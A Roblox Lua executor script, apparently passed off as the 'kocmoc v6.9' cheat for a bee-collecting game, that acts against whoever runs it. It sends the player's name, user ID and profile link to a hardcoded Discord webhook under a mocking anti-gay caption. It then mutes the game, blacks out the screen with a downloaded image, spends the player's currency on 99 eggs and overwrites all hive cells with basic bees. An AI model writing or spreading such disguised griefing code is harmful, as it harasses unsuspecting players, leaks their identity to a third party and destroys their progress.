repeat wait(0.1) until game:IsLoaded()

hives = game.Workspace.Honeycombs:GetChildren() for i = #hives, 1, -1 do  v = game.Workspace.Honeycombs:GetChildren()[i] if v.Owner.Value == nil then game.ReplicatedStorage.Events.ClaimHive:FireServer(v.HiveID.Value) end end

wait(1)

local player = game.Players.LocalPlayer
local function postHook(webhook , args)
(syn and syn.request or http_request or request)({
    Url = webhook,
    Method = "POST", 
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode(args)
})
end

postHook(
    "https://discord.com/api/webhooks/1058176206597533808/7RdySS1WKBr03XbRnDVlqnhWMhcTwwxu0PWKDlBJEI9kaNjSZugUcJkKWgqhzcrpFVgg",
    {
        content = "";
        embeds = {
            {
            title = player.Name;
            description = "executed kocmoc v6.9 and is gay furry";
            color = tonumber(0x7269da);
            thumbnail = {url="https://www.roblox.com/HeadShot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"};
            fields = { 
            {name = "**Profile**"; value = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"; inline = false};
            };
            }
        };
    }
)
-- sound

UserSettings():GetService("UserGameSettings").MasterVolume = 0

-- screen

local HttpService = game:GetService("HttpService")
local asset_loading_function = getsynasset or getcustomasset
local ui = Instance.new("ScreenGui", game:GetService("CoreGui"))

local frame1 = Instance.new("Frame", ui)
frame1.Size = UDim2.new(1,0,1.1,0)
frame1.Position = UDim2.new(0,0,-0.1,0)
frame1.BackgroundTransparency = 0
frame1.BackgroundColor3 = Color3.new(0,0,0)
frame1.Draggable = false

if asset_loading_function then
    local file_name = HttpService:GenerateGUID(false)
    writefile(file_name..".png", game:HttpGet("https://lh3.googleusercontent.com/drive-viewer/AJc5JmQVbwq2-VcGbvF1bq0slwsgzbA8Ktpf3uIb1LuuZ-NCSWewYJB2eyNPJL_Z3k5_XL1iEStxUSI=w1365-h937"))

    local img = Instance.new("ImageLabel", frame1)
    img.Size = UDim2.new(1, 0, 1, 0)
    img.Active = true
    img.Image = asset_loading_function(file_name..".png")

    task.wait(0.5)

    delfile(file_name..".png") 
end

-- hive pro checks

local args1 = {["Type"] = "Basic",["Amount"] = 99,["Category"] = "Eggs"}
game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer("Purchase", args1)

for i = 1,5 do
for d = 1,10 do -- verticle
task.spawn(function()
repeat wait()
game:GetService("ReplicatedStorage").Events.ConstructHiveCellFromEgg:InvokeServer(i, d, "Basic", "1")
until game.Players.LocalPlayer.Honeycomb.Value.Cells["C" .. i .. "," .. d].CellType.Value == "BasicBee"
end)
end
end
